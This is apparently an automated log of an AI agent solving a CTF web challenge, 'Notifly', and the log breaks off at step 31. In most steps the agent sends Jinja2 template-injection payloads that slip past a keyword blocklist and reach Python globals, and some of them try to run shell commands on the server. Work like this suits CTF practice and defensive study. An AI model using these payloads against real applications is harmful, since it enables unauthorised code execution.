# Notifly [MEDIUM]

<!-- SCRIBE: replace this block with a 5-line 'what the trick was' intro. -->

- **Category**: WEB
- **Points**: 250
- **Solves**: 1
- **Flag**: `FLAG{jinja2-sst1-rc3-g4dg3t}`
- **Winner**: `deepseek-flash`
- **Swarm cost**: $0.02 (winner $0.02)
- **Wall time**: 3m04s
- **Traces**: 2

## Adversarial description flags

- Flags: flag_claim
- Ground truth: Description flagged as adversarial. CTFd submit result and raw distfile bytes are authoritative. Description claims are hypotheses.

## Description

~~~
Notifly is a transactional-messaging tool. Compose a notification template,
drop in your variables, and preview how it renders.
**Flag format:** `FLAG{...}`
**Connection:** http://chal2.hackathon.ke:8010
~~~

## Trace

| Model | Status | Steps | Cost | Wall | Trace |
|---|---|---:|---:|---:|---|
| `deepseek-flash` | flag_found / CONFIRMED | 35 | $0.02 | 3m04s | `trace-Notifly_[MEDIUM]-deepseek-flash-20261029-133424.jsonl` |
| `claude-opus-4-6` | gave_up | 0 | $0.00 | 6s | `trace-Notifly_[MEDIUM]-claude-opus-4-6-20261029-133424.jsonl` |

_Window: 2026-10-29T13:34:40 to 2026-10-29T13:37:45_

## Solution path

### Step 1: `bash`
~~~
{
  "command": "ls -la /challenge/distfiles/; cat /tools.txt",
  "timeout_seconds": 60
}
~~~

~~~
CTF SANDBOX TOOLS REFERENCE
============================
All tools pre-installed in the sandbox. cat /tools.txt to view this file.

== NETWORKING ==
nc (netcat)        TCP/UDP connections. nc host port <<'EOF' for heredoc sessions.
curl               HTTP client. -s silent, -k skip TLS, -d data, -H header.
wget               HTTP download. wget -O file url.
nmap               Port scanner. nmap -sV host, nmap -p- host.
ffuf               Web fuzzer. ffuf -w wordlist -u http://host/FUZZ
gobuster           Directory/DNS/vhost brute force. gobuster dir -u http://host -w wordlist

== PASSWORD CRACKING ==
hashcat            GPU/CPU hash cracker. hashcat -m 0 -a 0 hashes.txt wordlist.txt
john               John the Ripper. john --wordlist=wordlist hashes.txt

== BINARY ANALYSIS ==
file               Identify file type. file binary
strings            Extract printable strings. strings -n 8 binary
xxd                Hex dump. xxd file | head, xxd -r to reverse.
hexdump            Hex dump. hexdump -C file.
binwalk            Firmware/embedded extraction. binwalk -e file to extract.
objdump            Disassembly. objdump -d binary (from binutils).
... [2000 chars total]
~~~

### Step 2: `bash`
~~~
{
  "command": "curl -s -i http://chal2.hackathon.ke:8010/ | head -50; echo; curl -s http://chal2.hackathon.ke:8010/robots.txt",
  "timeout_seconds": 60
}
~~~

~~~
HTTP/1.1 200 OK
Server: gunicorn
Date: Thu, 29 Oct 2026 10:35:09 GMT
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 6424

<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Notifly — Templates</title>
<style>
  :root{--bg:#fdf4fb;--panel:#fff;--ink:#2a0f2b;--muted:#8a5c86;--line:#f0dcee;
        --brand:#c026d3;--brand-ink:#a21caf;--brand-soft:#fbe8fb;--ok:#059669;--err:#b91c1c;
        --shadow:0 1px 2px rgba(16,24,40,.06),0 1px 3px rgba(16,24,40,.1);--radius:12px;}
  *{box-sizing:border-box}html,body{margin:0;height:100%}
  body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Inter,Helvetica,Arial,sans-serif;background:var(--bg);color:var(--ink);font-size:14px;line-height:1.5}
  .brand{display:flex;align-items:center;gap:10px;font-weight:700;font-size:16px}
  .logo{width:28px;height:28px;border-radius:8px;background:linear-gradient(135deg,#f0abfc,#c026d3);display:grid;place-items:center;color:#fff;font-weight:800;box-shadow:var(--shadow)}
... [2000 chars total]
~~~

### Step 3: `bash`
~~~
{
  "command": "curl -s http://chal2.hackathon.ke:8010/ | tail -120",
  "timeout_seconds": 60
}
~~~

~~~
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Notifly — Templates</title>
<style>
  :root{--bg:#fdf4fb;--panel:#fff;--ink:#2a0f2b;--muted:#8a5c86;--line:#f0dcee;
        --brand:#c026d3;--brand-ink:#a21caf;--brand-soft:#fbe8fb;--ok:#059669;--err:#b91c1c;
        --shadow:0 1px 2px rgba(16,24,40,.06),0 1px 3px rgba(16,24,40,.1);--radius:12px;}
  *{box-sizing:border-box}html,body{margin:0;height:100%}
  body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Inter,Helvetica,Arial,sans-serif;background:var(--bg);color:var(--ink);font-size:14px;line-height:1.5}
  .brand{display:flex;align-items:center;gap:10px;font-weight:700;font-size:16px}
  .logo{width:28px;height:28px;border-radius:8px;background:linear-gradient(135deg,#f0abfc,#c026d3);display:grid;place-items:center;color:#fff;font-weight:800;box-shadow:var(--shadow)}
  .btn{appearance:none;border:1px solid transparent;border-radius:9px;padding:9px 16px;font-weight:600;font-size:14px;cursor:pointer;background:var(--brand);color:#fff}
  .btn:hover{background:var(--brand-ink)}
  .muted{color:var(--muted)}
... [2000 chars total]
~~~

### Step 4: `bash`
~~~
{
  "command": "curl -s -X POST http://chal2.hackathon.ke:8010/api/preview -H 'Content-Type: application/json' -d '{\"template\":\"{{7*7}} {{config}} {{self}}\"}'; echo; curl -s -X POST http://chal2.hackathon.ke:8010/api/preview -H 'Content-Type: application/json' -d '{\"template\":\"{{ ''.__class__ }}\"}'",
  "timeout_seconds": 60
}
~~~

~~~
{"blocked":true,"ok":true,"rendered":"template rejected: contains a blocked token (the preview sandbox strips those). sample ref: FAKE-FLAG{Try-Harder-Mate}"}

{"blocked":true,"ok":true,"rendered":"template rejected: contains a blocked token (the preview sandbox strips those). sample ref: FAKE-FLAG{Try-Harder-Mate}"}
~~~

### Step 5: `bash`
~~~
{
  "command": "cd /challenge/workspace; test(){ echo -n \"[$1] \"; curl -s -X POST http://chal2.hackathon.ke:8010/api/preview -H 'Content-Type: application/json' -d \"{\\\"template\\\":\\\"$1\\\"}\"; echo; }\ntest 'hello'\ntest '{{user.name}}'\ntest '{{user}}'\ntest '{{ settings }}'\ntest '{{ settings.footer }}'\ntest '{{user.__class__}}'\ntest '{{ user.keys() }}'",
  "timeout_seconds": 60
}
~~~

~~~
[hello] {"blocked":false,"ok":true,"rendered":"hello"}

[{{user.name}}] {"blocked":false,"ok":true,"rendered":"Alex Rivera"}

[{{user}}] {"blocked":false,"ok":true,"rendered":"{'name': 'Alex Rivera', 'email': 'alex@acme.io', 'plan': 'Pro'}"}

[{{ settings }}] {"blocked":false,"ok":true,"rendered":"{'theme': 'light', 'footer': 'Sent by Notifly', 'secret': 'FAKE-FLAG{Try-Harder-Mate}'}"}

[{{ settings.footer }}] {"blocked":false,"ok":true,"rendered":"Sent by Notifly"}

[{{user.__class__}}] {"blocked":true,"ok":true,"rendered":"template rejected: contains a blocked token (the preview sandbox strips those). sample ref: FAKE-FLAG{Try-Harder-Mate}"}

[{{ user.keys() }}] {"blocked":false,"ok":true,"rendered":"dict_keys(['name', 'email', 'plan'])"}
~~~

### Step 6: `bash`
~~~
{
  "command": "cd /challenge/workspace; t(){ printf '%s => ' \"$1\"; curl -s -X POST http://chal2.hackathon.ke:8010/api/preview -H 'Content-Type: application/json' --data-binary \"$(jq -nc --arg t \"$1\" '{template:$t}')\" | jq -r .rendered; }\nt '{{ self }}'\nt '{{ cycler }}'\nt '{{ cycler.__init__ }}'\nt '{{ lipsum }}'\nt '{{ namespace }}'\nt '{{ range }}'\nt '{{ dict }}'\nt '{{ get_flashed_messages }}'\nt '{{ url_for }}'\nt '{{ request }}'",
  "timeout_seconds": 60
}
~~~

~~~
{{ self }} => <TemplateReference None>
{{ cycler }} => <class 'jinja2.utils.Cycler'>
{{ cycler.__init__ }} => template rejected: contains a blocked token (the preview sandbox strips those). sample ref: FAKE-FLAG{Try-Harder-Mate}
{{ lipsum }} => <function generate_lorem_ipsum at 0x7b45b780dd00>
{{ namespace }} => <class 'jinja2.utils.Namespace'>
{{ range }} => <class 'range'>
{{ dict }} => <class 'dict'>
{{ get_flashed_messages }} => 
{{ url_for }} => 
{{ request }} =>
~~~

### Step 7: `bash`
~~~
{
  "command": "cd /challenge/workspace; t(){ printf '%s => ' \"$1\"; curl -s -X POST http://chal2.hackathon.ke:8010/api/preview -H 'Content-Type: application/json' --data-binary \"$(jq -nc --arg t \"$1\" '{template:$t}')\" | jq -r .rendered; }\nfor x in class mro base subclasses init globals builtins import eval popen attr getitem join format config env os sys open '__' 'import' 'class' 'globals' 'popen' 'eval' 'lipsum.__globals__' '{%' 'os.popen' 'request.application' 'url_for.__globals__' 'x.__init__'; do t \"a$x\"\"b\"; done",
  "timeout_seconds": 60
}
~~~

~~~
aclassb => template rejected: contains a blocked token (the preview sandbox strips those). sample ref: FAKE-FLAG{Try-Harder-Mate}
amrob => template rejected: contains a blocked token (the preview sandbox strips those). sample ref: FAKE-FLAG{Try-Harder-Mate}
abaseb => abaseb
asubclassesb => template rejected: contains a blocked token (the preview sandbox strips those). sample ref: FAKE-FLAG{Try-Harder-Mate}
ainitb => ainitb
aglobalsb => aglobalsb
abuiltinsb => abuiltinsb
aimportb => aimportb
aevalb => aevalb
apopenb => apopenb
aattrb => aattrb
agetitemb => agetitemb
ajoinb => ajoinb
aformatb => aformatb
aconfigb => template rejected: contains a blocked token (the preview sandbox strips those). sample ref: FAKE-FLAG{Try-Harder-Mate}
aenvb => aenvb
aosb => aosb
asysb => asysb
aopenb => aopenb
a__b => template rejected: contains a blocked token (the preview sandbox strips those). sample ref: FAKE-FLAG{Try-Harder-Mate}
aimportb => aimportb
aclassb => template rejected: contains a blocked token (the preview sandbox strips those). sample ref: FAKE-FLAG{Try-Harder-Mate}
aglobalsb => aglobalsb
apopenb => apopenb
aevalb => aevalb
... [1682 chars total]
~~~

### Step 8: `bash`
~~~
{
  "command": "cd /challenge/workspace; t(){ printf '%s => ' \"$1\"; curl -s -X POST http://chal2.hackathon.ke:8010/api/preview -H 'Content-Type: application/json' --data-binary \"$(jq -nc --arg t \"$1\" '{template:$t}')\" | jq -r .rendered; }\nt '{{ user[\"na\"~\"me\"] }}'\nt '{{ user[(\"na\",\"me\")|join] }}'\nt '{{ user[\"|\".join([\"na\",\"me\"])] }}'\nt '{{ cycler[\"__init__\"] }}'\nt '{{ user|attr(\"__class__\") }}'\nt '{{ \"%c%c\"|format(95,95) }}'\nt '{{ \"a\"[\"__cl\"~\"ass__\"] }}'\nt '{% set x = \"cl\" %}{{ user.__class__ }}'\nt '{{ user[\"__class__\"] }}'",
  "timeout_seconds": 60
}
~~~

~~~
{{ user["na"~"me"] }} => Alex Rivera
{{ user[("na","me")|join] }} => Alex Rivera
{{ user["|".join(["na","me"])] }} => 
{{ cycler["__init__"] }} => template rejected: contains a blocked token (the preview sandbox strips those). sample ref: FAKE-FLAG{Try-Harder-Mate}
{{ user|attr("__class__") }} => template rejected: contains a blocked token (the preview sandbox strips those). sample ref: FAKE-FLAG{Try-Harder-Mate}
{{ "%c%c"|format(95,95) }} => __
{{ "a"["__cl"~"ass__"] }} => template rejected: contains a blocked token (the preview sandbox strips those). sample ref: FAKE-FLAG{Try-Harder-Mate}
{% set x = "cl" %}{{ user.__class__ }} => template rejected: contains a blocked token (the preview sandbox strips those). sample ref: FAKE-FLAG{Try-Harder-Mate}
{{ user["__class__"] }} => template rejected: contains a blocked token (the preview sandbox strips those). sample ref: FAKE-FLAG{Try-Harder-Mate}
~~~

### Step 9: `bash`
~~~
{
  "command": "cd /challenge/workspace; t(){ printf '%s => ' \"$1\"; curl -s -X POST http://chal2.hackathon.ke:8010/api/preview -H 'Content-Type: application/json' --data-binary \"$(jq -nc --arg t \"$1\" '{template:$t}')\" | jq -r .rendered; }\nt '{{ user[\"na\"~\"me\"] }}'\nt '{{ settings[\"sec\"~\"ret\"] }}'\nt '{{ \"%c%c\"|format(95,95)|length }}'\nt '{{ user.__class__|string }}'",
  "timeout_seconds": 60
}
~~~

~~~
{{ user["na"~"me"] }} => Alex Rivera
{{ settings["sec"~"ret"] }} => FAKE-FLAG{Try-Harder-Mate}
{{ "%c%c"|format(95,95)|length }} => 2
{{ user.__class__|string }} => template rejected: contains a blocked token (the preview sandbox strips those). sample ref: FAKE-FLAG{Try-Harder-Mate}
~~~

### Step 10: `bash`
~~~
{
  "command": "cd /challenge/workspace; t(){ printf '%s => ' \"$1\"; curl -s -X POST http://chal2.hackathon.ke:8010/api/preview -H 'Content-Type: application/json' --data-binary \"$(jq -nc --arg t \"$1\" '{template:$t}')\" | jq -r .rendered; }\nt '{{ range(3)|list }}'\nt '{{ lipsum(1)|length }}'\nt '{{ range(3)|sum }}'",
  "timeout_seconds": 60
}
~~~

~~~
{{ range(3)|list }} => [0, 1, 2]
{{ lipsum(1)|length }} => 398
{{ range(3)|sum }} => 3
~~~

### Step 11: `bash`
~~~
{
  "command": "cd /challenge/workspace; t(){ printf '%s => ' \"$1\"; curl -s -X POST http://chal2.hackathon.ke:8010/api/preview -H 'Content-Type: application/json' --data-binary \"$(jq -nc --arg t \"$1\" '{template:$t}')\" | jq -r .rendered; }\nt '{{ (user|list)[0] }}'\nt '{{ (user|attr(\"na\"~\"me\")) }}'\nt '{{ ((user|attr(\"__class__\"))) }}'",
  "timeout_seconds": 60
}
~~~

~~~
{{ (user|list)[0] }} => name
{{ (user|attr("na"~"me")) }} => 
{{ ((user|attr("__class__"))) }} => template rejected: contains a blocked token (the preview sandbox strips those). sample ref: FAKE-FLAG{Try-Harder-Mate}
~~~

### Step 12: `bash`
~~~
{
  "command": "cd /challenge/workspace; t(){ printf '%s => ' \"$1\"; curl -s -X POST http://chal2.hackathon.ke:8010/api/preview -H 'Content-Type: application/json' --data-binary \"$(jq -nc --arg t \"$1\" '{template:$t}')\" | jq -r .rendered; }\nt '{{ cycler|attr(\"__init__\") }}'\nt '{{ cycler|select(\"equalto\",\"x\")|list }}'\nt '{{ user|map(attribute=\"keys\")|list }}'\nt '{{ user.values()|list }}'",
  "timeout_seconds": 60
}
~~~

~~~
{{ cycler|attr("__init__") }} => template rejected: contains a blocked token (the preview sandbox strips those). sample ref: FAKE-FLAG{Try-Harder-Mate}
{{ cycler|select("equalto","x")|list }} => render error: 'type' object is not iterable
{{ user|map(attribute="keys")|list }} => [Undefined, Undefined, Undefined]
{{ user.values()|list }} => ['Alex Rivera', 'alex@acme.io', 'Pro']
~~~

### Step 13: `bash`
~~~
{
  "command": "cd /challenge/workspace; t(){ printf '%s => ' \"$1\"; curl -s -X POST http://chal2.hackathon.ke:8010/api/preview -H 'Content-Type: application/json' --data-binary \"$(jq -nc --arg t \"$1\" '{template:$t}')\" | jq -r .rendered; }\nt '{{ user.items()|attr(\"|\".join([\"__cl\",\"ass__\"])) }}'\nt '{{ user|attr(\"|\".join([\"__cl\",\"ass__\"])) }}'\nt '{{ \"%c%cinit%c%c\"|format(95,95,95,95) }}'\nt '{{ cycler|attr(\"%c%cinit%c%c\"|format(95,95,95,95)) }}'",
  "timeout_seconds": 60
}
~~~

~~~
{{ user.items()|attr("|".join(["__cl","ass__"])) }} => template rejected: contains a blocked token (the preview sandbox strips those). sample ref: FAKE-FLAG{Try-Harder-Mate}
{{ user|attr("|".join(["__cl","ass__"])) }} => template rejected: contains a blocked token (the preview sandbox strips those). sample ref: FAKE-FLAG{Try-Harder-Mate}
{{ "%c%cinit%c%c"|format(95,95,95,95) }} => __init__
{{ cycler|attr("%c%cinit%c%c"|format(95,95,95,95)) }} => <function Cycler.__init__ at 0x7b45b7816c00>
~~~

### Step 14: `bash`
~~~
{
  "command": "cd /challenge/workspace; t(){ printf '%s => ' \"$1\"; curl -s -X POST http://chal2.hackathon.ke:8010/api/preview -H 'Content-Type: application/json' --data-binary \"$(jq -nc --arg t \"$1\" '{template:$t}')\" | jq -r .rendered; }\nU='{% set u=\"%c@\"|format(95) %}'\nt \"$U\"'{{ cycler|attr(u%2B\"%cin%cit%c%c\"|format(95,95,95,95))|attr(u%2B\"%cglobals%c%c\"|format(95,95)) }}'",
  "timeout_seconds": 60
}
~~~

~~~
{% set u="%c@"|format(95) %}{{ cycler|attr(u%2B"%cin%cit%c%c"|format(95,95,95,95))|attr(u%2B"%cglobals%c%c"|format(95,95)) }} => render error: expected token ',', got 'B'
~~~

### Step 15: `bash`
~~~
{
  "command": "cd /challenge/workspace; cat > tpl_test.py <<'EOF'\nimport requests, json, sys\nbase='http://chal2.hackathon.ke:8010/api/preview'\ndef t(tpl):\n    r=requests.post(base,json={'template':tpl})\n    try: return r.json()['rendered']\n    except: return r.text\nif __name__=='__main__':\n    for a in sys.argv[1:]:\n        print(repr(a),'=>',repr(t(a)))\nEOF\npython3 tpl_test.py '{% set u=\"%c@\"|format(95) %}{{ cycler|attr(u~\"%cin%cit%c%c\"|format(95,95,95,95))|attr(u~\"%cglobals%c%c\"|format(95,95)) }}'",
  "timeout_seconds": 60
}
~~~

~~~
'{% set u="%c@"|format(95) %}{{ cycler|attr(u~"%cin%cit%c%c"|format(95,95,95,95))|attr(u~"%cglobals%c%c"|format(95,95)) }}' => 'render error: not enough arguments for format string'
~~~

### Step 16: `bash`
~~~
{
  "command": "cd /challenge/workspace; python3 tpl_test.py '{% set u=\"%c@\"|format(95) %}{{ cycler|attr(u~\"%cinit%c%c\"|format(95,95,95))|attr(u~\"%cglobals%c%c\"|format(95,95)) }}'",
  "timeout_seconds": 60
}
~~~

~~~
'{% set u="%c@"|format(95) %}{{ cycler|attr(u~"%cinit%c%c"|format(95,95,95))|attr(u~"%cglobals%c%c"|format(95,95)) }}' => 'render error: not enough arguments for format string'
~~~

### Step 17: `bash`
~~~
{
  "command": "cd /challenge/workspace; python3 -c \"\nimport tpl_test\nfor s in ['%c@','%cinit%c%c','%cglobals%c%c','%cbuiltins%c%c']:\n    print(s, tpl_test.t('{{ \\\"%s\\\"|format(%s) }}'%(s,','.join(['95']*s.count('%c')))))\n\"",
  "timeout_seconds": 60
}
~~~

~~~
%c@ _@
%cinit%c%c _init__
%cglobals%c%c _globals__
%cbuiltins%c%c _builtins__
~~~

### Step 18: `bash`
~~~
{
  "command": "cd /challenge/workspace; python3 -c \"\nimport tpl_test\nu='@'\nq=lambda name,n: u+'%c'+name+'%c%c'.format() if False else None\ndef dq(name):\n    n=len(name)\n    return u+('%c'+name+'%c%c')%((95,)*(n+2))[0:1] if False else None\nprint(tpl_test.t('{{ (\\\"%c@\\\") }}'))\n\"",
  "timeout_seconds": 60
}
~~~

~~~
%c@
~~~

### Step 19: `bash`
~~~
{
  "command": "cd /challenge/workspace; cat > exp.py <<'EOF'\nimport tpl_test\ndef dq(name, u='@'):\n    s = u + \"%c\" + name + \"%c%c\"\n    return '(\"%s\"|format(%s))' % (s, ','.join(['95']*s.count('%c')))\ninit=dq('init'); glob=dq('globals'); built=dq('builtins')\nprint(init,glob,built)\ntpl = '{%% set u=\"%%c@\"|format(95) %%}{{ cycler|attr(%s)|attr(%s) }}' % (init.replace('@','u'),glob.replace('@','u'))\nprint(tpl)\nprint(tpl_test.t(tpl))\nEOF\npython3 exp.py",
  "timeout_seconds": 60
}
~~~

~~~
("@%cinit%c%c"|format(95,95,95)) ("@%cglobals%c%c"|format(95,95,95)) ("@%cbuiltins%c%c"|format(95,95,95))
{% set u="%c@"|format(95) %}{{ cycler|attr(("u%cinit%c%c"|format(95,95,95)))|attr(("u%cglobals%c%c"|format(95,95,95))) }}
render error: 'type object' has no attribute 'u_init__'
~~~

### Step 20: `bash`
~~~
{
  "command": "cd /challenge/workspace; cat > exp.py <<'EOF'\nimport tpl_test\ndef q(name):\n    s = \"%c\" + name + \"%c%c\"\n    return '(\"%s\"|format(%s))' % (s, ','.join(['95']*s.count('%c')))\ninit=q('init'); glob=q('globals'); built=q('builtins')\ntpl = '{{ cycler|attr(%s)|attr(%s) }}' % (init,glob)\nprint(tpl)\nprint(tpl_test.t(tpl))\nEOF\npython3 exp.py",
  "timeout_seconds": 60
}
~~~

~~~
{{ cycler|attr(("%cinit%c%c"|format(95,95,95)))|attr(("%cglobals%c%c"|format(95,95,95))) }}
render error: 'type object' has no attribute '_init__'
~~~

### Step 21: `bash`
~~~
{
  "command": "cd /challenge/workspace; cat > exp.py <<'EOF'\nimport tpl_test\ndef q(name):\n    s = \"%c%c\" + name + \"%c%c\"\n    return '(\"%s\"|format(%s))' % (s, ','.join(['95']*s.count('%c')))\ninit=q('init'); glob=q('globals'); built=q('builtins')\ntpl = '{{ cycler|attr(%s)|attr(%s) }}' % (init,glob)\nprint(tpl)\nprint(tpl_test.t(tpl))\nprint(tpl_test.t('{{ cycler|attr((\"%c%cinit%c%c\"|format(95,95,95,95)))|attr((\"%c%cglobals%c%c\"|format(95,95,95,95)))|list }}'))\nEOF\npython3 exp.py",
  "timeout_seconds": 60
}
~~~

~~~
{{ cycler|attr(("%c%cinit%c%c"|format(95,95,95,95)))|attr(("%c%cglobals%c%c"|format(95,95,95,95))) }}
... [2000 chars total]
~~~

### Step 22: `bash`
~~~
{
  "command": "cd /challenge/workspace; cat > exp.py <<'EOF'\nimport tpl_test\ndef q(name):\n    s = \"%c%c\" + name + \"%c%c\"\n    return '(\"%s\"|format(%s))' % (s, ','.join(['95']*s.count('%c')))\ndef prefix():\n    return '{{ cycler|attr(%s)|attr(%s)' % (q('init'), q('globals'))\n# list /tmp/notifly\np = prefix() + '|attr(%s)(%s)|list }}' % (q('get'), repr('/tmp/notifly'))\nprint(p); print(tpl_test.t(p))\nEOF\npython3 exp.py",
  "timeout_seconds": 60
}
~~~

~~~
{{ cycler|attr(("%c%cinit%c%c"|format(95,95,95,95)))|attr(("%c%cglobals%c%c"|format(95,95,95,95)))|attr(("%c%cget%c%c"|format(95,95,95,95)))('/tmp/notifly')|list }}
render error: 'dict object' has no attribute '__get__'
~~~

### Step 23: `bash`
~~~
{
  "command": "cd /challenge/workspace; cat > exp.py <<'EOF'\nimport tpl_test,sys\ndef q(name):\n    s = \"%c%c\" + name + \"%c%c\"\n    return '(\"%s\"|format(%s))' % (s, ','.join(['95']*s.count('%c')))\ndef g():\n    return 'cycler|attr(%s)|attr(%s)' % (q('init'), q('globals'))\ndef run(expr):\n    p='{{ %s }}'%expr\n    print(p); print(tpl_test.t(p)); print()\nrun(\"%s[%r]|list\" % (g(),'/tmp/notifly'))\nrun(\"%s[%s][%r](%r)|list\" % (g(), q('get'),'os','ls -la /tmp/notifly; ls -la /; cat /app/*.py 2>/dev/null'))\nEOF\npython3 exp.py",
  "timeout_seconds": 60
}
~~~

~~~
{{ cycler|attr(("%c%cinit%c%c"|format(95,95,95,95)))|attr(("%c%cglobals%c%c"|format(95,95,95,95)))['/tmp/notifly']|list }}
render error: expected token 'end of print statement', got '['

{{ cycler|attr(("%c%cinit%c%c"|format(95,95,95,95)))|attr(("%c%cglobals%c%c"|format(95,95,95,95)))[("%c%cget%c%c"|format(95,95,95,95))]['os']('ls -la /tmp/notifly; ls -la /; cat /app/*.py 2>/dev/null')|list }}
render error: expected token 'end of print statement', got '['
~~~

### Step 24: `bash`
~~~
{
  "command": "cd /challenge/workspace; cat > exp.py <<'EOF'\nimport tpl_test,sys\ndef q(name):\n    s = \"%c%c\" + name + \"%c%c\"\n    return '(\"%s\"|format(%s))' % (s, ','.join(['95']*s.count('%c')))\ndef g():\n    return '(cycler|attr(%s)|attr(%s))' % (q('init'), q('globals'))\ndef run(expr):\n    p='{{ %s }}'%expr\n    print(p); print(tpl_test.t(p)); print()\nrun(\"%s[%r]|list\" % (g(),'/tmp/notifly'))\nrun(\"%s[%s][%r](%r)|list\" % (g(), q('get'),'os','ls -la /tmp/notifly; ls -la /'))\nEOF\npython3 exp.py",
  "timeout_seconds": 60
}
~~~

~~~
{{ (cycler|attr(("%c%cinit%c%c"|format(95,95,95,95)))|attr(("%c%cglobals%c%c"|format(95,95,95,95))))['/tmp/notifly']|list }}
[]

{{ (cycler|attr(("%c%cinit%c%c"|format(95,95,95,95)))|attr(("%c%cglobals%c%c"|format(95,95,95,95))))[("%c%cget%c%c"|format(95,95,95,95))]['os']('ls -la /tmp/notifly; ls -la /')|list }}
render error: 'dict object' has no attribute '__get__'
~~~

### Step 25: `bash`
~~~
{
  "command": "cd /challenge/workspace; cat > exp.py <<'EOF'\nimport tpl_test,sys\ndef q(name):\n    s = \"%c%c\" + name + \"%c%c\"\n    return '(\"%s\"|format(%s))' % (s, ','.join(['95']*s.count('%c')))\ndef g():\n    return '(cycler|attr(%s)|attr(%s))' % (q('init'), q('globals'))\ndef run(expr):\n    p='{{ %s }}'%expr\n    print(p); print(tpl_test.t(p)); print()\ncmd=sys.argv[1]\nrun(\"%s[%s](%r)|list\" % (g(), q('get'),cmd))\nEOF\npython3 exp.py 'ls -la /tmp/notifly; ls -la /; ls -la /app; id'",
  "timeout_seconds": 60
}
~~~

~~~
{{ (cycler|attr(("%c%cinit%c%c"|format(95,95,95,95)))|attr(("%c%cglobals%c%c"|format(95,95,95,95))))[("%c%cget%c%c"|format(95,95,95,95))]('ls -la /tmp/notifly; ls -la /; ls -la /app; id')|list }}
render error: 'dict object' has no attribute '__get__'
~~~

### Step 26: `bash`
~~~
{
  "command": "cd /challenge/workspace; cat > exp.py <<'EOF'\nimport tpl_test,sys\ndef q(name):\n    s = \"%c%c\" + name + \"%c%c\"\n    return '(\"%s\"|format(%s))' % (s, ','.join(['95']*s.count('%c')))\ndef g():\n    return '((cycler|attr(%s)|attr(%s)))' % (q('init'), q('globals'))\ndef run(expr):\n    p='{{ %s }}'%expr\n    print(p); print(tpl_test.t(p)); print()\ncmd=sys.argv[1]\nrun(\"%s[%s](%r)|list\" % (g(), q('get'),cmd))\nEOF\npython3 exp.py 'ls -la /tmp/notifly; ls -la /; ls -la /app; id'",
  "timeout_seconds": 60
}
~~~

~~~
{{ ((cycler|attr(("%c%cinit%c%c"|format(95,95,95,95)))|attr(("%c%cglobals%c%c"|format(95,95,95,95)))))[("%c%cget%c%c"|format(95,95,95,95))]('ls -la /tmp/notifly; ls -la /; ls -la /app; id')|list }}
render error: 'dict object' has no attribute '__get__'
~~~

### Step 27: `bash`
~~~
{
  "command": "cd /challenge/workspace; cat > exp.py <<'EOF'\nimport tpl_test,sys\ndef q(name):\n    s = \"%c%c\" + name + \"%c%c\"\n    return '(\"%s\"|format(%s))' % (s, ','.join(['95']*s.count('%c')))\ndef g():\n    return '((cycler|attr(%s)|attr(%s)))' % (q('init'), q('globals'))\ndef run(expr):\n    p='{{ %s }}'%expr\n    print(p); print(tpl_test.t(p)); print()\ncmd=sys.argv[1]\nrun(\"%s|attr(%s)(%r)|list\" % (g(), q('get'),cmd))\nEOF\npython3 exp.py 'ls -la /tmp/notifly; ls -la /; ls -la /app; id'",
  "timeout_seconds": 60
}
~~~

~~~
{{ ((cycler|attr(("%c%cinit%c%c"|format(95,95,95,95)))|attr(("%c%cglobals%c%c"|format(95,95,95,95)))))|attr(("%c%cget%c%c"|format(95,95,95,95)))('ls -la /tmp/notifly; ls -la /; ls -la /app; id')|list }}
render error: 'dict object' has no attribute '__get__'
~~~

### Step 28: `bash`
~~~
{
  "command": "cd /challenge/workspace; python3 -c \"\nimport tpl_test\nq=lambda n:'(\\\"%c%c'+n+'%c%c\\\"|format(95,95,95,95))'\nprint(tpl_test.t('{{ ((cycler|attr('+q('init')+')|attr('+q('globals')+'))) }}'))\nprint(tpl_test.t('{{ ((cycler|attr('+q('init')+')|attr('+q('globals')+')))|attr('+q('get')+') }}'))\n\"",
  "timeout_seconds": 60
}
~~~

~~~
{'__name__': 'jinja2.utils', '__doc__': None, '__package__': 'jinja2', '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7b45b77eb680>, '__spec__': ModuleSpec(name='jinja2.utils', loader=<_frozen_importlib_external.SourceFileLoader object at 0x7b45b77eb680>, origin='/usr/local/lib/python3.12/site-packages/jinja2/utils.py'), '__file__': '/usr/local/lib/python3.12/site-packages/jinja2/utils.py', '__cached__': '/usr/local/lib/python3.12/site-packages/jinja2/__pycache__/utils.cpython-312.pyc', '__builtins__': {'__name__': 'builtins', '__doc__': "Built-in functions, types, exceptions, and other objects.\n\nThis module provides direct access to all 'built-in'\nidentifiers of Python; for example, builtins.len is\nthe full name for the built-in function len().\n\nThis module is not normally accessed explicitly by most\napplications, but can be useful in modules that provide\nobjects with the same name as a built-in value, but in\nwhich the built-in of that name is also needed.", '__package__': '', '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': ModuleSpec(name='builtins', loader=<class '_frozen_importlib.BuiltinImporter'>, origin='built-in'), '__
... [2000 chars total]
~~~

### Step 29: `bash`
~~~
{
  "command": "cd /challenge/workspace; python3 -c \"\nimport tpl_test\nq=lambda n:'(\\\"%c%c'+n+'%c%c\\\"|format(95,95,95,95))'\nprint(tpl_test.t('{{ ((cycler|attr('+q('init')+')|attr('+q('globals')+'))|attr('+q('get')+')) }}'))\nprint(tpl_test.t('{{ ((cycler|attr('+q('init')+')|attr('+q('globals')+'))|attr('+q('get')+')|attr('+q('get')+')) }}'))\n\"",
  "timeout_seconds": 60
}
~~~

~~~
(no output)
~~~

### Step 30: `bash`
~~~
{
  "command": "cd /challenge/workspace; python3 exp.py 'ls -la /app /tmp/notifly; id; ls /' 2>&1 | tail -5",
  "timeout_seconds": 60
}
~~~

~~~
{{ ((cycler|attr(("%c%cinit%c%c"|format(95,95,95,95)))|attr(("%c%cglobals%c%c"|format(95,95,95,95)))))|attr(("%c%cget%c%c"|format(95,95,95,95)))('ls -la /app /tmp/notifly; id; ls /')|list }}
render error: 'dict object' has no attribute '__get__'
~~~

### Step 31: `bash`
~~~
{
